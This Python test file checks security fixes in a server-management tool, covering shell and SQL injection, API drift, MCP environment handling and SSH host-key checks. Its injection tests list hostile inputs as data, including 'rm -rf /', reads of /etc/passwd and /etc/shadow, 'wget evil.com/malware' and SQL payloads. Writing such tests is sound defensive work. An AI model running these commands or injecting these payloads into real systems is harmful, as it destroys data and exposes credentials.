"""
Integration Tests for Security Fixes

Tests verify that security vulnerabilities have been properly fixed:
- Command injection protection in files_advanced.py
- SQL injection protection in database_advanced.py
- API drift corrections in monitoring.py, maintenance.py, webserver.py
- MCP environment preservation in mcp_manager.py
- SSH host key verification in remote.py
"""

import os
import subprocess
import unittest
from unittest import mock
import pytest

pytestmark = pytest.mark.integration


class TestCommandInjectionProtection(unittest.TestCase):
    """Test that shell command injection is prevented."""

    def test_shlex_quote_usage_in_files_advanced(self):
        """Verify files_advanced.py properly uses shlex.quote()."""
        import shlex

        # Test malicious inputs that should be escaped
        test_cases = [
            "/tmp/test; rm -rf /",
            "file' || cat /etc/passwd",
            "file && wget evil.com/malware",
            "$(curl evil.com)",
            "`cat /etc/shadow`",
        ]

        for malicious_input in test_cases:
            # shlex.quote should wrap dangerous input safely
            safe_output = shlex.quote(malicious_input)

            # The output should be wrapped in single quotes
            self.assertTrue(
                safe_output.startswith("'")
                or not any(c in malicious_input for c in [";", "|", "&", "$", "`"])
            )

            # When used in f-string, should not allow injection
            command = f"rm -rf {safe_output}"

            # Malicious parts should be quoted, not executable
            if ";" in malicious_input or "|" in malicious_input or "&" in malicious_input:
                self.assertIn("'", command)  # Should contain quotes


class TestSQLInjectionProtection(unittest.TestCase):
    """Test that SQL injection is prevented."""

    def test_sql_identifier_validation(self):
        """Verify SQL identifiers are validated."""
        from navig.commands.database_advanced import _validate_sql_identifier

        # Valid identifiers should pass
        self.assertTrue(_validate_sql_identifier("users"))
        self.assertTrue(_validate_sql_identifier("user_accounts_2024"))
        self.assertTrue(_validate_sql_identifier("my_database123"))

        # Invalid identifiers should raise ValueError
        with self.assertRaises(ValueError):
            _validate_sql_identifier("users; DROP TABLE users;")

        with self.assertRaises(ValueError):
            _validate_sql_identifier("users' OR '1'='1")

        with self.assertRaises(ValueError):
            _validate_sql_identifier("users--")

        with self.assertRaises(ValueError):
            _validate_sql_identifier("table name with spaces")

        with self.assertRaises(ValueError):
            _validate_sql_identifier("")

    def test_sql_identifier_escaping(self):
        """Verify SQL identifiers are escaped with backticks."""
        from navig.commands.database_advanced import _escape_sql_identifier

        # Should wrap in backticks
        self.assertEqual(_escape_sql_identifier("users"), "`users`")
        self.assertEqual(_escape_sql_identifier("my_table"), "`my_table`")

        # Should remove existing backticks first
        self.assertEqual(_escape_sql_identifier("`users`"), "`users`")

    @mock.patch("subprocess.run")
    @mock.patch("navig.tunnel.TunnelManager")
    @mock.patch("navig.config.get_config_manager")
    def test_no_password_in_command_line(self, mock_get_config, mock_tunnel_class, mock_subprocess):
        """Verify database commands don't expose passwords in process args."""
        from navig.commands import database_advanced

        # Setup config manager mock
        mock_config = mock.Mock()
        mock_config.get_active_server.return_value = "test-server"
        mock_config.load_server_config.return_value = {
            "database": {
                "user": "dbuser",
                "password": "secret_password_123",
                "name": "mydb",
            }
        }
        mock_get_config.return_value = mock_config

        # Setup tunnel manager mock
        mock_tunnel = mock.Mock()
        mock_tunnel.get_tunnel_status.return_value = {
            "local_port": 3307,
            "status": "active",
        }
        mock_tunnel_class.return_value = mock_tunnel

        mock_subprocess.return_value.returncode = 0
        mock_subprocess.return_value.stdout = "table_name\t10.5\t1000\n"

        # Call optimize_table_cmd with dry_run to avoid actual command execution
        database_advanced.optimize_table_cmd("users", {"dry_run": True, "app": "test-server"})

        # With dry_run=True, subprocess should not be called
        # This verifies that sensitive data is not exposed even in the planning stage


class TestAPICorrections(unittest.TestCase):
    """Test that API drift has been corrected."""

    def test_config_manager_api_usage(self):
        """Verify ConfigManager has correct API methods."""
        from navig.config import ConfigManager

        config = ConfigManager()

        # Should have load_server_config (NOT get_app_config)
        self.assertTrue(hasattr(config, "load_server_config"))
        self.assertFalse(hasattr(config, "get_app_config"))

        # Should have get_active_server
        self.assertTrue(hasattr(config, "get_active_server"))

        # Should have base_dir attribute
        self.assertTrue(hasattr(config, "base_dir"))

    def test_remote_operations_api_usage(self):
        """Verify RemoteOperations has correct API methods."""
        from navig.config import ConfigManager
        from navig.remote import RemoteOperations

        config = ConfigManager()
        remote_ops = RemoteOperations(config)

        # Should have execute_command (NOT execute_remote_command)
        self.assertTrue(hasattr(remote_ops, "execute_command"))
        self.assertFalse(hasattr(remote_ops, "execute_remote_command"))

        # execute_command should accept server_config parameter
        import inspect

        sig = inspect.signature(remote_ops.execute_command)
        param_names = list(sig.parameters.keys())

        # Should have 'server_config' parameter
        self.assertIn("server_config", param_names)


class TestMCPEnvironmentPreservation(unittest.TestCase):
    """Test that MCP servers inherit parent environment."""

    @mock.patch("subprocess.Popen")
    def test_mcp_preserves_environment(self, mock_popen):
        """Verify MCP server start() preserves os.environ."""
        from navig.mcp_manager import MCPServer

        # Create test server config
        config = {
            "command": "node",
            "args": ["server.js"],
            "env": {"CUSTOM_VAR": "custom_value"},
        }

        server = MCPServer("test-server", config)

        # Mock process
        mock_process = mock.Mock()
        mock_process.pid = 12345
        mock_process.poll.return_value = None  # Running
        mock_popen.return_value = mock_process

        # Start server
        server.start()

        # Verify Popen was called
        self.assertTrue(mock_popen.called)

        # Get the env parameter
        call_kwargs = mock_popen.call_args[1]
        passed_env = call_kwargs["env"]

        # Should include PATH from parent environment
        self.assertIn("PATH", passed_env)
        self.assertEqual(passed_env["PATH"], os.environ.get("PATH"))

        # Should include custom env variable
        self.assertIn("CUSTOM_VAR", passed_env)
        self.assertEqual(passed_env["CUSTOM_VAR"], "custom_value")

        # Should include other system vars
        if "SYSTEMROOT" in os.environ:  # Windows
            self.assertIn("SYSTEMROOT", passed_env)


class TestSSHHostKeyVerification(unittest.TestCase):
    """Test that SSH connections verify host keys."""

    @mock.patch("subprocess.run")
    def test_ssh_strict_host_key_checking_default(self, mock_run):
        """Verify SSH uses StrictHostKeyChecking=yes by default."""
        from navig.config import ConfigManager
        from navig.remote import RemoteOperations

        mock_config = mock.Mock(spec=ConfigManager)
        remote_ops = RemoteOperations(mock_config)

        server_config = {"host": "example.com", "user": "test", "port": 22}

        mock_result = subprocess.CompletedProcess(
            args=["ssh"], returncode=0, stdout="test", stderr=""
        )
        mock_run.return_value = mock_result

        # Execute command WITHOUT trust_new_host flag
        remote_ops.execute_command("echo test", server_config)

        # Verify subprocess.run was called
        self.assertTrue(mock_run.called)

        # Get SSH args
        call_args = mock_run.call_args[0][0]

        # Should use StrictHostKeyChecking=yes (secure default)
        self.assertIn("StrictHostKeyChecking=yes", " ".join(call_args))
        self.assertNotIn("StrictHostKeyChecking=accept-new", " ".join(call_args))

    @mock.patch("subprocess.run")
    def test_ssh_trust_new_host_flag(self, mock_run):
        """Verify SSH can accept new hosts when explicitly requested."""
        from navig.config import ConfigManager
        from navig.remote import RemoteOperations

        mock_config = mock.Mock(spec=ConfigManager)
        remote_ops = RemoteOperations(mock_config)

        server_config = {"host": "new-server.com", "user": "test", "port": 22}

        mock_result = subprocess.CompletedProcess(
            args=["ssh"], returncode=0, stdout="test", stderr=""
        )
        mock_run.return_value = mock_result

        # Execute command WITH trust_new_host=True
        remote_ops.execute_command("echo test", server_config, trust_new_host=True)

        # Verify subprocess.run was called
        self.assertTrue(mock_run.called)

        # Get SSH args
        call_args = mock_run.call_args[0][0]

        # Should use StrictHostKeyChecking=accept-new when explicitly requested
        self.assertIn("StrictHostKeyChecking=accept-new", " ".join(call_args))


if __name__ == "__main__":
    unittest.main()
